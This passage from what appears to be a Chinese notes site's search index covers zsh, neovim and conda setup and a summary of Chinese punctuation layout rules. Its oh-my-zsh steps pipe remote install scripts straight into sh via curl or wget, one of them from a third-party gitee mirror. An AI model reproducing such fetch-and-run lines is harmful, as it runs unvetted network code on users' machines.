\u9ed8\u8ba4\u7aef\u53e3\u53f7\u7684\u670d\u52a1\u3002\u4e3a\u4e86\u81ea\u5b9a\u4e49\u7aef\u53e3\u53f7\u80fd\u591f\u987a\u5229\u767b\u5f55\uff0c\u9700\u8981\u624b\u52a8\u4fee\u6539\u8bb0\u5f55\u7684\u5bc6\u94a5\u4fe1\u606f\u3002</p> <p>\u6253\u5f00\u201c\u94a5\u5319\u4e32\u8bbf\u95ee\u201d app\uff08\u4e0d\u662f\u65b0\u7684\u201c\u5bc6\u7801\u201d app\uff09\uff0c\u5728\u767b\u5f55-\u6240\u6709\u5bc6\u7801\u4e2d\u641c\u7d22\u5730\u5740\u6216\u57df\u540d\uff0c\u627e\u5230\u201c\u7f51\u7edc\u5bc6\u7801\u201d\u548c\u201c\u65f6\u95f4\u673a\u5668\u7f51\u7edc\u5bc6\u7801\u201d\u4e24\u9879\uff0c\u53cc\u51fb\u6253\u5f00\uff0c\u4fee\u6539\u5176\u4e2d\u7684\u201c\u4f4d\u7f6e\u201d\uff0c\u624b\u52a8\u52a0\u4e0a\u7aef\u53e3\u53f7\uff0c\u5373\u53ef\u5728\u540e\u7eed\u81ea\u52a8\u767b\u5f55\u4e0a\u5907\u4efd\u78c1\u76d8\u3002</p>"},{"location":"devops/system/shell/","title":"\u547d\u4ee4\u884c shell \u914d\u7f6e","text":"<p> \u7ea6 335 \u4e2a\u5b57  44 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p>Abstract</p> <p>\u4e3b\u8981\u662f\u5728\u914d\u7f6e\u65b0\u73af\u5883\u7684\u65f6\u5019\u8981\u505a\u7684\u4e00\u4e9b\u4e8b\u60c5</p>"},{"location":"devops/system/shell/#zsh","title":"zsh \u76f8\u5173","text":""},{"location":"devops/system/shell/#_1","title":"\u5b89\u88c5","text":"<ul> <li>mac \u81ea\u5e26</li> <li>Linux \u4f7f\u7528\u5bf9\u5e94\u8f6f\u4ef6\u5305\u7ba1\u7406\u5668\u5b89\u88c5 zsh \u5373\u53ef<ul> <li><code>sudo apt install zsh</code></li> </ul> </li> <li>\u67e5\u770b zsh \u8def\u5f84\uff1a<code>which zsh</code></li> <li>\u66f4\u6539\u9ed8\u8ba4 shell\uff1a<code>sudo chsh -s /usr/bin/zsh</code></li> </ul>"},{"location":"devops/system/shell/#_2","title":"\u4e3b\u9898","text":"<ul> <li>\u5b89\u88c5 oh-my-zsh\uff08\u56db\u9009\u4e00\uff09<ul> <li><code>sh -c \"$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\"</code></li> <li><code>sh -c \"$(curl -fsSL https://gitee.com/mirrors/oh-my-zsh/raw/master/tools/install.sh)\"</code></li> <li><code>sh -c \"$(wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)\"</code></li> <li><code>sh -c \"$(wget -O- https://gitee.com/pocmon/mirrors/raw/master/tools/install.sh)\"</code></li> </ul> </li> <li>\u5b89\u88c5 powerlevel10k\uff08p10k\uff09<ul> <li><code>git clone --depth=1 https://github.com/romkatv/powerlevel10k.git ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k</code></li> <li><code>git clone --depth=1 https://gitee.com/romkatv/powerlevel10k.git ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k</code></li> <li>\u5728 ~/.zshrc \u4e2d\u8bbe\u7f6e ZSH_THEME \u4e3a \"powerlevel10k/powerlevel10k\"</li> </ul> </li> </ul>"},{"location":"devops/system/shell/#_3","title":"\u63d2\u4ef6","text":"<ul> <li>\u81ea\u5e26 git \u63d2\u4ef6</li> <li>zsh-autosuggestions\uff1a<code>git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions</code></li> <li>zsh-syntax-highlighting\uff1a<code>git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting</code></li> <li>\u7136\u540e\u5728 ~/.zshrc \u4e2d\u8bbe\u7f6e plugins=(git zsh-autosuggestions zsh-syntax-highlighting)</li> </ul>"},{"location":"devops/system/shell/#alias","title":"\u5e38\u7528 alias","text":"<ul> <li>\u4fee\u6539 vim \u81f3 nvim     <pre><code>alias vim='/usr/local/bin/nvim'\nalias ovim='/usr/bin/vim'\n</code></pre></li> <li>\u7528  sharkdp/bat \u66ff\u4ee3 cat \u5b9e\u73b0\u8bed\u6cd5\u9ad8\u4eae     <pre><code># (on macOS) brew install bat\nalias cat='bat -pp'\n</code></pre> <pre><code># (on Linux) sudo apt install bat\nalias cat='batcat -pp'\n</code></pre></li> <li>\u8bbe\u7f6e\u4ee3\u7406\u4e0e\u53d6\u6d88\u4ee3\u7406     <pre><code>alias proxy=\"export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890\"\nalias noproxy=\"unset https_proxy http_proxy all_proxy\"\n</code></pre><ul> <li>orbstack \u7684\u865a\u62df\u673a\u8fde\u63a5\u4e3b\u673a\u7684\u4ee3\u7406\uff1a     <pre><code>alias proxy=\"export https_proxy=http://host.orb.internal:7890 http_proxy=http://host.orb.internal:7890 all_proxy=socks5://host.orb.internal:7890\"\n</code></pre></li> </ul> </li> <li>ssh \u8df3\u677f\u4ee3\u7406\u5feb\u6377\u5f00\u5173     <pre><code>alias sshproxy=\"sed -i '' 's/# ProxyCommand ssh jump/ProxyCommand ssh jump/g' ~/.ssh/config\"\nalias sshnoproxy=\"sed -i '' 's/ProxyCommand ssh jump/# ProxyCommand ssh jump/g' ~/.ssh/config\"\n</code></pre></li> <li>\u6d4b\u8bd5\u4ee3\u7406\u662f\u5426\u751f\u6548     <pre><code>alias google='curl -v -I https://www.google.com/'\n</code></pre></li> </ul>"},{"location":"devops/system/shell/#conda","title":"conda \u73af\u5883\u5b89\u88c5","text":"<p>\u5b89\u88c5 miniconda\uff1a</p> <pre><code>mkdir -p ~/miniconda\nwget https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh -O ~/miniconda/miniconda.sh\nbash ~/miniconda/miniconda.sh -b -u -p ~/miniconda\nrm ~/miniconda/miniconda.sh\n\nsource ~/miniconda/bin/activate\nconda init zsh\n# conda init --all \u4f1a\u83ab\u540d\u5176\u5999\u52a0\u5176\u4ed6\u4e0d\u5b58\u5728\u7684 shell \u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u6bd4\u5982\u521b\u5efa fish \u7684\u914d\u7f6e\u4e4b\u7c7b\u7684\n</code></pre> <p>\u6240\u6709\u53ef\u7528\u7684\u5e73\u53f0\u3001\u67b6\u6784\u7684\u5b89\u88c5\u811a\u672c\u90fd\u5728 https://repo.anaconda.com/miniconda/</p>"},{"location":"devops/system/shell/#neovim","title":"neovim \u914d\u7f6e","text":""},{"location":"devops/system/shell/#_4","title":"\u5b89\u88c5","text":"<ul> <li>macOS\uff1aHomebrew \u4e0a\u7684\u662f\u65b0\u7684\uff0c\u53ef\u4ee5\u76f4\u63a5\u5b89\u88c5\uff1a     <pre><code>brew install neovim\n</code></pre></li> <li>Linux\uff1adebian / ubuntu \u7684\u8f6f\u4ef6\u5305\u90fd\u5f88\u8001\uff0c\u8981\u4ece GitHub \u5b89\u88c5\uff1a     <pre><code>wget https://github.com/neovim/neovim/releases/latest/download/nvim-linux64.tar.gz\ntar xzvf nvim-linux64.tar.gz\ncd nvim-linux64\nsudo cp -r bin/nvim /usr/local/bin\nsudo cp -r lib/nvim /usr/local/lib\nsudo cp -r share/nvim /usr/local/share\n</code></pre></li> </ul>"},{"location":"devops/system/shell/#_5","title":"\u914d\u7f6e","text":"<ul> <li>\u4e0b\u8f7d\u914d\u7f6e\u6587\u4ef6\uff1a\u6211\u7684 nvim \u914d\u7f6e\u6587\u4ef6\u5728  TonyCrane/nvim-config <pre><code>cd ~/.config\ngit clone https://github.com/TonyCrane/nvim-config.git nvim\n</code></pre></li> <li>\u5b89\u88c5 packer.nvim\uff1a     <pre><code>git clone --depth 1 https://github.com/wbthomason/packer.nvim\\\n~/.local/share/nvim/site/pack/packer/start/packer.nvim\n</code></pre></li> <li>\u6253\u5f00 nvim \u8df3\u8fc7\u6240\u6709\u62a5\u9519\uff0c\u6267\u884c <code>:PackerSync</code> \u5b89\u88c5\u63d2\u4ef6</li> </ul>"},{"location":"devops/system/shell/#vim","title":"\u7b80\u8981 vim \u914d\u7f6e","text":"<p>\u5728\u4e0d\u60f3\u88c5 nvim \u7684\u670d\u52a1\u5668\u4e0a\u4e34\u65f6\u7528 vim \u7684\u7b80\u5355\u914d\u7f6e\uff1a</p> <pre><code>syntax on\nset expandtab\nset number\nset autoindent\nset smartindent\nset tabstop=4\nset shiftwidth=4\nset softtabstop=4\nset laststatus=2\nset mouse=a\nset scrolloff=4\ninoremap { {}&lt;ESC&gt;i\ninoremap {&lt;CR&gt; {&lt;CR&gt;}&lt;ESC&gt;O\n</code></pre>"},{"location":"devops/typesetting/clreq/","title":"\u4e2d\u6587\u6392\u7248\u9700\u6c42","text":"<p> \u7ea6 2220 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p> <p>Abstract</p> <p>w3c \u6807\u51c6\u6587\u6863 Requirements for Chinese Text Layout \u4e2d\u6587\u6392\u7248\u9700\u6c42\u7684\u7cbe\u7b80\u3001\u6574\u7406\u3002</p> <p>\u8fd9\u4e2a\u6587\u6863\u6574\u7406\u4e86\u4e2d\u6587\uff08\u6c49\u5b57\uff09\u4e66\u5199\u7cfb\u7edf\u4e8e\u6392\u7248\u4e0a\u7684\u9700\u6c42\u3002\u662f\u76f8\u5bf9\u6bd4\u8f83\u5b8c\u6574\u3001\u9700\u8981\u9075\u5faa\u7684\u89c4\u8303\u3002</p> <p>\u7531\u4e8e\u5e76\u4e0d\u5e38\u4f7f\u7528\u76f4\u6392\u5f62\u5f0f\uff0c\u6240\u4ee5\u672c\u6587\u53ea\u6574\u7406\u6709\u5173\u6a2a\u6392\u7684\u90e8\u5206\u3002</p>"},{"location":"devops/typesetting/clreq/#_2","title":"\u6807\u70b9\u7b26\u53f7\u53ca\u5176\u6392\u7248","text":""},{"location":"devops/typesetting/clreq/#_3","title":"\u6807\u70b9\u7b26\u53f7\u7684\u5b57\u5f62\u3001\u5c3a\u5bf8\u4e0e\u5b57\u9762\u5206\u5e03","text":"<ul> <li>\u70b9\u53f7\uff0c\u5360\u4e00\u4e2a\u5b57\u5bbd\uff0c\u6e2f\u53f0\u4f4d\u4e8e\u5b57\u9762\u6b63\u4e2d\uff0c\u5927\u9646\u4f4d\u4e8e\u6587\u5b57\u672b\u7aef\uff0c\u5b57\u9762\u59cb\u7aef\u504f\u5e95\u7aef\uff08\u5373\u5de6\u4e0b\u89d2\uff09</li> <li>\u5939\u6ce8\u53f7\uff08\u5305\u62ec\u5f15\u53f7\u3001\u62ec\u53f7\u3001\u53cc\u4e66\u540d\u53f7\u7b49\uff09\uff0c\u4f4d\u4e8e\u6587\u672c\u4e24\u4fa7\uff0c\u5360\u4e00\u4e2a\u5b57\u5bbd</li> <li>\u7701\u7565\u53f7\u3001\u7834\u6298\u53f7\u4f4d\u4e8e\u5b57\u9762\u6b63\u4e2d\uff0c\u5360\u4e24\u4e2a\u5b57\u5bbd\uff0c\u4e0d\u53ef\u5206\u884c\u65ad\u5f00</li> <li>\u8fde\u63a5\u53f7\u4f4d\u4e8e\u5b57\u9762\u6b63\u4e2d\uff0c\u5360\u4e00\u4e2a\u5b57\u5bbd\uff0c\u7532\u5f0f\u8fde\u63a5\u53f7\uff08\u2013\uff09\u5728\u6a2a\u6392\u65f6\u76f4\u7ebf\u957f\u5ea6\u5e94\u7a0d\u5c0f\u4e8e\u6c49\u5b57\u4e00</li> <li>\u95f4\u9694\u53f7\u4f4d\u4e8e\u5b57\u9762\u6b63\u4e2d\uff0c\u5360\u4e00\u4e2a\u5b57\u5bbd\uff0c\u4e3a\u4e86\u8282\u7701\u6392\u7248\u7a7a\u95f4\u7d27\u51d1\u6392\u5217\u53ef\u4ee5\u4f7f\u7528\u534a\u4e2a\u5b57\u5bbd</li> </ul>"},{"location":"devops/typesetting/clreq/#_4","title":"\u884c\u9996\u884c\u5c3e\u7981\u5219","text":"<p>\u5206\u4e3a\u56db\u79cd\u7ea7\u522b\u7684\u884c\u9996\u884c\u5c3e\u7981\u5219\uff08\u907f\u5934\u5c3e\u89c4\u5219\uff09\uff1a</p> <ul> <li>\u4e0d\u5904\u7406<ul> <li>\u5b8c\u5168\u4e0d\u5904\u7406\u884c\u9996\u884c\u5c3e\u7981\u5219</li> </ul> </li> <li>\u57fa\u672c\u5904\u7406<ul> <li>\u70b9\u53f7\u3001\u7ed3\u675f\u5f15\u53f7\u3001\u7ed3\u675f\u62ec\u53f7\u3001\u7ed3\u675f\u4e66\u540d\u53f7\u3001\u8fde\u63a5\u53f7\u3001\u95f4\u9694\u53f7\u3001\u5206\u9694\u53f7\u4e0d\u80fd\u51fa\u73b0\u5728\u4e00\u884c\u5f00\u5934</li> <li>\u5f00\u59cb\u5f15\u53f7\u3001\u5f00\u59cb\u62ec\u53f7\u3001\u5f00\u59cb\u4e66\u540d\u53f7\u7b49\u4e0d\u80fd\u51fa\u73b0\u5728\u4e00\u884c\u7ed3\u5c3e</li> <li>\u662f\u6700\u63a8\u8350\u7684\u505a\u6cd5</li> </ul> </li> <li>GB \u6cd5<ul> <li>\u5728\u57fa\u672c\u5904\u7406\u7684\u57fa\u7840\u4e0a\u589e\u52a0</li> <li>\u5206\u9694\u53f7\u4e0d\u80fd\u51fa\u73b0\u5728\u4e00\u884c\u7ed3\u5c3e</li> </ul> </li> <li>\u4e25\u683c\u5904\u7406<ul> <li>\u5728 GB \u6cd5\u57fa\u7840\u4e0a\u589e\u52a0</li> <li>\u7834\u6298\u53f7\u3001\u7701\u7565\u53f7\u4e0d\u80fd\u51fa\u73b0\u5728\u4e00\u884c\u5f00\u5934</li> </ul> </li> </ul> <p>\u4e14\u5904\u7406\u7981\u5219\u524d\u8981\u5148\u6309\u7167\u6392\u7248\u98ce\u683c\u8fdb\u884c\u6807\u70b9\u5bbd\u5ea6\u7684\u8c03\u6574\u3002</p> <p>\u8fdb\u884c\u7981\u5219\u5904\u7406\u65f6\u5e94\u9075\u5b88\u201c\u5148\u6324\u8fdb\uff0c\u540e\u63a8\u51fa\u201d\u539f\u5219\u3002</p> <p>\u539f\u5219\u4e0a\u4e00\u4efd\u6587\u6863\u5185\u7684\u7ea7\u522b\u5e94\u8be5\u7edf\u4e00\uff0c\u4f46\u7279\u6b8a\u60c5\u51b5\u53ef\u4ee5\u7279\u6b8a\u5904\u7406\u3002\u4e14\u884c\u9996\u884c\u5c3e\u7981\u5219\u5c5e\u4e8e\u6392\u7248\u98ce\u683c\uff0c\u7528\u6237\u53ef\u4ee5\u81ea\u5b9a\u4e49\u66f4\u9002\u5408\u7684\u7981\u5219\u3002</p>"},{"location":"devops/typesetting/clreq/#_5","title":"\u7b26\u53f7\u5206\u79bb\u7981\u5219","text":"<ul> <li>\u6807\u70b9\u7b26\u53f7<ul> <li>\u4ee5\u4e0b\u6807\u70b9\u7b26\u53f7\u5360\u4e24\u4e2a\u5b57\u5bbd\uff0c\u89c6\u4e3a\u4e00\u4e2a\u5b57\u7b26\u5b58\u5728\uff0c\u4e0d\u80fd\u4e3a\u4e86\u9002\u914d\u800c\u62c6\u6210\u4e24\u884c\uff1a<ul> <li>\u4e59\u5f0f\u62ec\u53f7\u548c\u7834\u6298\u53f7</li> <li>\u7701\u7565\u53f7</li> </ul> </li> </ul> </li> <li>\u6570\u5b57\u53ca\u5176\u76f8\u5e94\u7684\u524d\u540e\u7f00\u5355\u4f4d\u7b26\u53f7</li> </ul>"},{"location":"devops/typesetting/clreq/#_6","title":"\u6807\u70b9\u7b26\u53f7\u7684\u5bbd\u5ea6\u8c03\u6574","text":"<ul> <li>\u8c03\u6574\u7a7a\u95f4\u5206\u7c7b\uff1a<ul> <li>\u4e0d\u53ef\u8c03\u6574\uff1a\u534a\u5bbd\u6807\u70b9\u3001\u6e2f\u53f0\u5f0f\u95ee\u53f7\u53f9\u53f7</li> <li>\u53ef\u8c03\u6574\uff1a<ul> <li>\u5b57\u9762\u5de6\u4fa7\uff1a\u201c\u300a\uff08\u300e\u300c \u7b49</li> <li>\u5b57\u9762\u53f3\u4fa7\uff1a\uff0c\u3002\u3001\uff1a\uff1b\uff1f\uff01\u201c\u300b\uff09\u300f\u300d\u7b49</li> <li>\u5b57\u9762\u5de6\u53f3\u4e24\u4fa7\uff1a\u6e2f\u53f0\u5f0f\u5c45\u4e2d\u70b9\u53f7</li> </ul> </li> </ul> </li> <li>\u8fde\u7eed\u6807\u70b9\u7b26\u53f7\u8c03\u6574<ul> <li>\u5f53\u5939\u6ce8\u7b26\u53f7\u4e0e\u5176\u4ed6\u7b26\u53f7\u8fde\u7eed\u6392\u5217\u6216\u5939\u6ce8\u7b26\u53f7\u91cd\u590d\u51fa\u73b0\u65f6\u90fd\u5e94\u8be5\u8fdb\u884c\u8c03\u6574\uff0c\u4f7f\u6587\u5b57\u4f53\u88c1\u66f4\u52a0\u7d27\u51d1\u6613\u8bfb</li> <li>\u8c03\u6574\uff1a\u4e24\u4e2a\u76f8\u90bb\u6807\u70b9\u5360 2 \u4e2a\u5b57\u5bbd\uff0c\u5219\u7f29\u51cf\u6210 1.5 \u5b57\u5bbd\uff1b\u4e5f\u5141\u8bb8\u8fdb\u4e00\u6b65\u8c03\u6574\u4e3a 1 \u4e2a\u5b57\u5bbd</li> <li>\u6324\u538b\u65b9\u5411\uff1a\u8ba9\u5f00\u59cb\u3001\u7ed3\u675f\u5939\u6ce8\u53f7\u7d27\u9760\u88ab\u5939\u6ce8\u7684\u5185\u5bb9</li> </ul> </li> <li>\u884c\u9996\u884c\u5c3e\u6807\u70b9\u6324\u538b<ul> <li>\u82e5\u884c\u9996\u51fa\u73b0\u5f00\u59cb\u5939\u6ce8\u53f7\uff0c\u5219\u7f29\u51cf\u5de6\u4fa7\u534a\u4e2a\u5b57\u5bbd\u7684\u7a7a\u767d</li> <li>\u539f\u672c\u5360\u4e00\u4e2a\u5b57\u5bbd\u7684\u6807\u70b9\u51fa\u73b0\u5728\u884c\u5c3e\u65f6\u5e94\u8be5\u7f29\u51cf\u53f3\u4fa7\u534a\u4e2a\u5b57\u5bbd\u7684\u7a7a\u767d</li> </ul> </li> </ul>"},{"location":"devops/typesetting/clreq/#_7","title":"\u884c\u5c3e\u70b9\u53f7\u60ac\u6302","text":"<ul> <li>\u7edd\u5927\u591a\u6570\u7684\u4e2d\u6587\u51fa\u7248\u7269\u6ca1\u6709\u60ac\u6302\u884c\u5c3e\u70b9\u53f7\u7684\u60ef\u4f8b</li> <li>\u70b9\u53f7\u60ac\u6302\u662f\u884c\u9996\u6807\u70b9\u7981\u5219\u5904\u7406\u65b9\u5f0f\u7684\u5ef6\u4f38\uff0c\u53ef\u4ee5\u907f\u514d\u6587\u5b57\u53ca\u70b9\u53f7\u5728\u524d\u540e\u884c\u7684\u79fb\u52a8\uff0c\u751a\u800c\u5bfc\u81f4\u524d\u884c\u5b57\u8ddd\u4e0d\u4e00\u7684\u95ee\u9898</li> <li>\u901a\u5e38\uff0c\u884c\u5c3e\u53ea\u53ef\u60ac\u6302\u4e00\u4e2a\u70b9\u53f7</li> <li>\u82e5\u70b9\u53f7\uff08\u987f\u53f7\u3001\u9017\u53f7\u6216\u53e5\u53f7\uff09\u5c06\u51fa\u73b0\u4e8e\u884c\u9996\uff0c\u53ef\u5c06\u5176\u7f6e\u4e8e\u524d\u4e00\u884c\u7684\u884c\u5c3e\u7aef\u3001\u7a81\u51fa\u7248\u5fc3</li> </ul>"},{"location":"devops/typesetting/clreq/#_8","title":"\u9644\uff1a\u6807\u70b9\u7b26\u53f7\u5206\u7c7b\u3001\u7528\u6cd5","text":""},{"location":"devops/typesetting/clreq/#_9","title":"\u70b9\u53f7","text":"<ul> <li> <p>\u53e5\u53f7\u3001\u9017\u53f7\u3001\u987f\u53f7</p> <ul> <li>\u53e5\u53f7 U+3002 IDEOGRAPHIC FULL STOP\uff08\u3002\uff09\u8bed\u53e5\u7ed3\u675f</li> <li>\u9017\u53f7 U+FF0C FULLWIDTH COMMA\uff08\uff0c\uff09\u8bed\u6c14\u505c\u987f</li> <li>\u987f\u53f7 U+3001 IDEOGRAPHIC COMMA\uff08\u3001\uff09\u5e76\u5217\u8fde\u7528</li> </ul> \u79d1\u6280\u6587\u732e\u4e2d\u53e5\u53f7 <p>\u79d1\u6280\u6587\u732e\u4e2d\u53e5\u53f7\u591a\u4f7f\u7528 U+FF0E FULLWIDTH FULL STOP\uff08\uff0e\uff09\u6765\u4ee3\u66ff\uff0c\u907f\u514d\u540c o\u30010 \u6df7\u6dc6</p> </li> <li> <p>\u5192\u53f7\u3001\u5206\u53f7</p> <ul> <li>\u5192\u53f7 U+FF1A FULLWIDTH COLON\uff08\uff1a\uff09\u5f15\u8ff0\u8bed\u53e5\u5f00\u59cb</li> <li>\u5206\u53f7 U+FF1B FULLWIDTH SEMICOLON\uff08\uff1b\uff09\u8bed\u53e5\u95f4\u610f\u4e49\u8f6c\u6298</li> </ul> </li> <li> <p>\u53f9\u53f7\u3001\u95ee\u53f7</p> <ul> <li>\u53f9\u53f7 U+FF01 FULLWIDTH EXCLAMATION MARK\uff08\uff01\uff09</li> <li>\u95ee\u53f7 U+FF1F FULLWIDTH QUESTION MARK\uff08\uff1f\uff09</li> </ul> \u53f9\u95ee\u53f7\u53e0\u52a0 <p>\u5f53\u8bed\u6c14\u540c\u65f6\u5177\u5907\u5f3a\u70c8\u7684\u7591\u95ee\u4e0e\u611f\u53f9\u65f6\uff0c\u53ef\u4e8e\u95ee\u53f7\u540e\u52a0\u4e0a\u53f9\u53f7\uff08?!\uff09\uff0c\u4e5f\u6709\u5728\u53f9\u53f7\u540e\u52a0\u95ee\u53f7\u7684\u7528\u6cd5 \u5728\u8bed\u6c14\u52a0\u91cd\u65f6\u4e5f\u53ef\u4ee5\u53e0\u7528\u95ee\u53f7\u6216\u53f9\u53f7\uff0c\u6700\u591a\u4e09\u4e2a  </p> <p>\u4e24\u4e2a\u53f9\u95ee\u53f7\u8fde\u7528\u5360\u4e00\u4e2a\u5b57\u4f4d\u7f6e\uff0c\u4e09\u4e2a\u53e0\u7528\u5360\u4e24\u4e2a\u5b57\u4f4d\u7f6e</p> <p>\u53ef\u89c6\u5b57\u4f53\u60c5\u51b5\u4f7f\u7528 U+2047 DOUBLE QUESTION MARK\uff08\u2047\uff09\u3001U+203C DOUBLE EXCLAMATION MARK\uff08\u203c\uff09\u3001U+2048 QUESTION EXCLAMATION MARK\uff08\u2048\uff09\u3001U+2049 EXCLAMATION QUESTION MARK\uff08\u2049\uff09\u7b49\u7b26\u53f7</p> </li> </ul>"},{"location":"devops/typesetting/clreq/#_10","title":"\u6807\u53f7","text":"<ul> <li>\u5f15\u53f7<ul> <li>\u5f3a\u8c03\u5b57\u8bcd\uff0c\u4f5c\u4e3a\u5f15\u7528\u8bdd\u8bed\u3001\u6587\u732e\u7684\u8d77\u8bab\u8fb9\u754c</li> <li>\u5c5e\u4e8e\u5939\u6ce8\u53f7</li> <li>\u53f0\u6e7e<ul> <li>\u5148\u5355\u3001\u540e\u53cc\uff0c\u4f7f\u7528\u76f4\u89d2\u5f15\u53f7</li> <li>\u5f00\u59cb\u5355\u76f4\u89d2\u5f15\u53f7 U+300C LEFT CORNER BRACKET\uff08\u300c\uff09</li> <li>\u7ed3\u675f\u5355\u76f4\u89d2\u5f15\u53f7 U+300D RIGHT CORNER BRACKET\uff08\u300d\uff09</li> <li>\u5f00\u59cb\u53cc\u76f4\u89d2\u5f15\u53f7 U+300E LEFT WHITE CORNER BRACKET\uff08\u300e\uff09</li> <li>\u7ed3\u675f\u53cc\u76f4\u89d2\u5f15\u53f7 U+300F RIGHT WHITE CORNER BRACKET\uff08\u300f\uff09</li> </ul> </li> <li>\u5927\u9646<ul> <li>\u5148\u53cc\u3001\u540e\u5355\uff0c\u6a2a\u6392\u7528\u5f2f\u5f15\u53f7\uff0c\u76f4\u6392\u7528\u76f4\u89d2\u5f15\u53f7</li> <li>\u5f00\u59cb\u53cc\u5f2f\u5f15\u53f7 U+201C LEFT DOUBLE QUOTATION MARK\uff08\u201c\uff09</li> <li>\u5f00\u59cb\u5355\u5f2f\u5f15\u53f7 U+2018 LEFT SINGLE QUOTATION MARK\uff08\u2018\uff09</li> <li>\u7ed3\u675f\u53cc\u5f2f\u5f15\u53f7 U+201D RIGHT DOUBLE QUOTATION MARK\uff08\u201d\uff09</li> <li>\u7ed3\u675f\u5355\u5f2f\u5f15\u53f7 U+2019 RIGHT SINGLE QUOTATION MARK\uff08\u2019\uff09</li> </ul> </li> <li>\u5f15\u6587\u4e0d\u6b62\u4e00\u6bb5\uff0c\u5e94\u5728\u6bcf\u6bb5\u5f00\u5934\u4f7f\u7528\u5f00\u59cb\u5f15\u53f7\uff0c\u53ea\u5728\u6700\u540e\u4e00\u6bb5\u672b\u5c3e\u4f7f\u7528\u7ed3\u675f\u5f15\u53f7</li> <li>Unicode \u7f16\u7801\u4e2d\u6709\u65cb\u8f6c\u540e\u7684\u76f4\u89d2\u5f15\u53f7\uff0c\u4f46\u4e0d\u9002\u5b9c\u76f4\u63a5\u4f7f\u7528</li> </ul> </li> <li>\u62ec\u53f7<ul> <li>\u884c\u5185\u6ce8\u91ca\u3001\u8bf4\u660e</li> <li>\u5c5e\u4e8e\u5939\u6ce8\u53f7</li> <li>\u7532\u5f0f<ul> <li>U+FF08 FULLWIDTH LEFT PARENTHESIS [\uff08]</li> <li>U+FF09 FULLWIDTH RIGHT PARENTHESIS [\uff09]</li> </ul> </li> <li>\u4e59\u5f0f<ul> <li>U+2E3A TWO-EM DASH\uff08\u2e3a\uff09</li> <li>\u6216\u4e24\u4e2a U+2014 EM DASH\uff08\u2014\uff09</li> <li>\u524d\u540e\u6784\u6210\u4e00\u5bf9</li> </ul> </li> <li>\u5176\u4f59\u8fd8\u6709\u3010\u3011\u3016\u3017\u3014\u3015\uff3b\uff3d\uff5b\uff5d\u7b49\uff0c\u5747\u4e3a\u5168\u5bbd</li> </ul> </li> <li>\u7834\u6298\u53f7<ul> <li>\u8bed\u6c14\u6216\u58f0\u97f3\u7684\u5ef6\u7eed\u3001\u8bed\u610f\u7684\u8f6c\u6362\u6216\u884c\u6587\u7684\u8865\u5145</li> <li>\u5448\u73b0\u4e0a\u4e3a\u4e00\u6761\u4f4d\u4e8e\u5b57\u9762\u6b63\u4e2d\u7684\u76f4\u7ebf\uff0c\u5360\u4e24\u4e2a\u5b57\u5bbd</li> <li>\u63a8\u8350\u4f7f\u7528 U+2E3A TWO-EM DASH\uff08\u2e3a\uff09</li> <li>\u901a\u5e38\u4e5f\u4f7f\u7528\u4e24\u4e2a\u8fde\u7eed\u7684 U+2014 EM DASH\uff08\u2014\uff09</li> </ul> </li> <li>\u7701\u7565\u53f7/\u5220\u8282\u53f7<ul> <li>\u8282\u7565\u539f\u6587\u3001\u8bed\u53e5\u672a\u5b8c\u6216\u8bed\u6c14\u7684\u4e0d\u8fde\u7eed</li> <li>\u5448\u73b0\u4e0a\u5360\u4e24\u4e2a\u5b57\u5bbd\uff0c\u5305\u542b\u516d\u4e2a\u7701\u7565\u70b9\u4e14\u5728\u6c34\u5e73\u3001\u5782\u76f4\u65b9\u5411\u5747\u4f4d\u4e8e\u5b57\u9762\u6b63\u4e2d</li> <li>\u901a\u5e38\u4f7f\u7528\u4e24\u4e2a\u8fde\u7eed\u7684 U+2026 HORIZONTAL ELLIPSIS\uff08\u2026\uff09\u5b9e\u73b0</li> <li>\u4e5f\u63a8\u8350\u4f7f\u7528\u4e24\u4e2a U+22EF MIDLINE HORIZONTAL ELLIPSIS\uff08\u22ef\uff09\u4fdd\u8bc1\u5c45\u4e2d</li> </ul> </li> <li>\u7740\u91cd\u53f7<ul> <li>\u8868\u793a\u76f8\u5e94\u6587\u672c\u7684\u5f3a\u8c03\u3001\u7740\u91cd\u8bed\u6c14\u6216\u907f\u514d\u6b67\u4e49</li> <li>\u5f62\u6001\u4e3a\u6807\u6ce8\u4e8e\u6587\u5b57\u5e95\u7aef\u6216\u9876\u7aef\u7684\u5706\u5f62\u4e2d\u9ed1\u70b9</li> <li>U+25CF BLACK CIRCLE\uff08\u25cf\uff09\u6216 U+2022 BULLET\uff08\u2022\uff09</li> </ul> </li> <li>\u8fde\u63a5\u53f7<ul> <li>\u7528\u4e8e\u8fde\u7ed3\u65f6\u7a7a\u8d77\u8bab\u6216\u6570\u91cf\u591a\u5be1\u7b49</li> <li>\u53f0\u6e7e<ul> <li>\u7532\u5f0f\uff1aU+2013 EN DASH\uff08\u2013\uff09</li> <li>\u4e59\u5f0f\uff1aU+FF5E FULLWIDTH TILDE\uff08\uff5e\uff09\u6216 U+007E TILDE\uff08~\uff09</li> </ul> </li> <li>\u5927\u9646<ul> <li>\u77ed\u6a2a\u7ebf\uff1aU+2013 EN DASH\uff08\u2013\uff09\uff0c\u5b9e\u9645\u89c4\u5b9a\u4e3a\u534a\u5b57\u5bbd</li> <li>\u4e00\u5b57\u7ebf\uff1aU+2014 EM DASH\uff08\u2014\uff09</li> <li>\u6d6a\u7eb9\u7ebf\uff1aU+FF5E FULLWIDTH TILDE\uff08\uff5e\uff09</li> </ul> </li> </ul> </li> <li>\u95f4\u9694\u53f7<ul> 